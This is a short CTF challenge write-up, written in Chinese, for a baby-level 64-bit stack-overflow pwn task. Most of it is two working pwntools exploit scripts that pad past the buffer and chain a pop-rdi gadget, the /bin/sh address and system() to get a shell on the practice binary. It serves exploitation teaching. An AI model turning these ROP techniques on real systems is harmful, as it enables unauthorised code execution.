# ret2text_64

- 作者：pn1fg
- 参考：W4terCTF 2023
- 难度：Baby
- 分类：Pwn
- 暴露端口：70

## 题目描述

64位栈溢出

## 题目解析

- 源码：[ret2text_64.c](build/ret2text_64.c)
- 考点：64位下ROP - ret2text

[exp.py](writeup/exp.py) :

```python
from pwn import *

context.arch = 'amd64'
context.log_level = "debug"

io = process("./ret2text_64")
elf = ELF("./ret2text_64")

pop_rdi_ret = 0x0040123d
bin_sh = 0x00404050
ret = 0x0040101a

io.sendlineafter(b"age?\n", b"1000")

payload = flat([
    cyclic(0x40 + 8),
    pop_rdi_ret,
    bin_sh,
    ret,
    elf.sym["system"]
])
io.sendlineafter(b"overflow!\n", payload)

io.interactive()
```

[exp2.py](writeup/exp2.py) :

```python
from pwn import *

context.arch = "amd64"
context.log_level = "debug"

io = process("./ret2text_64")
elf = ELF("./ret2text_64")
rop = ROP(elf)

io.sendlineafter(b"age?\n", b"1000")

padding = cyclic(0x40 + 8)
bin_sh = next(elf.search(b"/bin/sh"))
ret = rop.find_gadget(["ret"])

rop.raw(padding)
rop.raw(ret)
rop.call(elf.sym["system"], [bin_sh])
payload = rop.chain()

io.sendlineafter(b"overflow!\n", payload)

io.interactive()
```